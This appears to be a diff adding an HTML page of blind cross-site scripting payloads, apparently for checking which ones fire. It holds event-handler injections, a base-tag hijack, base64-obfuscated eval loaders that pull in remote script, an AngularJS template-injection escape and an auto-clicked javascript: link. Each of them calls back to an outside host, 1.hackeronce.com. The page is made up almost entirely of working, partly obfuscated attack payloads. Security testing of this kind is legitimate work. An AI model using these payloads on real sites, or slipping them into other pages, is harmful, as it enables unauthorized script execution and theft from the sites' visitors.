@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Blind XSS Verification Page</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+</head>
+<body ng-app="">
+    <h1>Payload Testing</h1>
+    <div id="payloads">
+        <!-- Event-Based & Tag-Based -->
+        <div class="test-case">
+            <h3>Image onerror</h3>
+            '"><img src=x onerror="this.src='https://1.hackeronce.com/?p=img-onerror'">
+        </div>
+
+        <div class="test-case">
+            <h3>Input autofocus</h3>
+            '"><input autofocus onfocus="fetch('https://1.hackeronce.com/?p=input-focus')">
+        </div>
+
+        <div class="test-case">
+            <h3>Iframe src</h3>
+            '"><iframe src="https://1.hackeronce.com/?p=iframe"></iframe>
+        </div>
+
+        <div class="test-case">
+            <h3>SVG onload</h3>
+            '"><svg onload="fetch('https://1.hackeronce.com/?p=svg-onload')"></svg>
+        </div>
+
+        <div class="test-case">
+            <h3>Base tag</h3>
+            <base href="https://1.hackeronce.com/?p=base-tag/" />
+        </div>
+
+        <!-- Obfuscated Payloads -->
+        <div class="test-case">
+            <h3>Base64 Image onerror</h3>
+            '"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0naHR0cHM6Ly8xLmhhY2tlcm9uY2UuY29tLz9wPWltZyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs=">
+        </div>
+
+        <div class="test-case">
+            <h3>Base64 SVG onload</h3>
+            '"><svg onload="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0naHR0cHM6Ly8xLmhhY2tlcm9uY2UuY29tLz9wPXN2Zyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs=">
+        </div>
+
+        <!-- Template Injection -->
+        <div class="test-case">
+            <h3>AngularJS Template</h3>
+            {{constructor.constructor("fetch('https://1.hackeronce.com/?p=angular')")()}}
+        </div>
+
+        <!-- JS Protocol (will be triggered by script) -->
+        <div class="test-case">
+            <h3>JS Protocol</h3>
+            <a id="js-proto-link" href="javascript:fetch('https://1.hackeronce.com/?p=js-protocol')">Click me</a>
+        </div>
+    </div>
+
+    <script>
+        // Trigger the JS protocol link automatically
+        setTimeout(() => {
+            document.getElementById('js-proto-link').click();
+        }, 1000);
+    </script>
+</body>
+</html>
